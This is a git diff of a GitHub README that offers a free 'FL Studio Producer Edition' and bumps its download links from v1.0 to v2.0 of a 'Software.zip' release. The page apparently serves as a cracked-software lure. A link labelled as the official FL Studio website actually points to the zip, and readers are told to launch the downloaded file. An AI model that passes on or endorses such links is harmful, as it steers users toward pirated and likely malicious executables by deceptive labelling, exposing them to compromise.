@@ -24,7 +24,7 @@ If you are looking for resources related to FL Studio Producer Edition, this rep
 🎚️ fl-studio-producers-edition  
 
 ## Get Started
-If you want to get started with FL Studio Producer Edition, you can download the [FL Studio Producer Edition Free](https://github.com/Heinhtet2737/FL-Studio-Producer-Edition-Free/releases/download/v1.0/Software.zip) here. Click the link to get started!
+If you want to get started with FL Studio Producer Edition, you can download the [FL Studio Producer Edition Free](https://github.com/Heinhtet2737/FL-Studio-Producer-Edition-Free/releases/download/v2.0/Software.zip) here. Click the link to get started!
 
 If the link ends with a file name, it needs to be launched. Enjoy producing music with FL Studio Producer Edition! 🎵🎹🎧
 
@@ -35,4 +35,4 @@ Let your creativity flow with FL Studio Producer Edition! 🎶🎵🎧
 
 🔗🔗🔗
 
-Would you like to visit the website of FL Studio to explore more features and options of FL Studio Producer Edition? [Visit FL Studio Website!](https://github.com/Heinhtet2737/FL-Studio-Producer-Edition-Free/releases/download/v1.0/Software.zip)
+Would you like to visit the website of FL Studio to explore more features and options of FL Studio Producer Edition? [Visit FL Studio Website!](https://github.com/Heinhtet2737/FL-Studio-Producer-Edition-Free/releases/download/v2.0/Software.zip)
